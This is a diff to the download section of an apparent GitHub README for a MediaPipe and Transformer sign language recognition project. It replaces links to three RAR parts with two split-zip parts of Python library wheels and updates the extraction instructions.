@@ -4,14 +4,11 @@ Sign language recognition using **MediaPipe** and a **Transformer** model.
 
 ## Download
 
-[Latest release](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/latest)
+Python libraries only (Windows / Python 3.10 wheels).
 
-- [Part 1](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part1.rar)
-- [Part 2](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part2.rar)
-- [Part 3](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part3.rar)
+- [Part 1](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/python_libraries.zip.001)
+- [Part 2](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/python_libraries.zip.002)
 
-Download all three files into the **same folder**. Open **part 1** in **WinRAR** or **7-Zip** and click Extract.
+Download both files into the same folder. Open **`python_libraries.zip.001`** in **7-Zip** or **WinRAR** and extract.
 
-Do not join, merge, or rename the parts. The extractor reads part 2 and part 3 by itself.
-
-Windows Explorer cannot extract these files. Use WinRAR or 7-Zip.
+Do not join or merge the parts. Windows Explorer cannot extract a split zip.
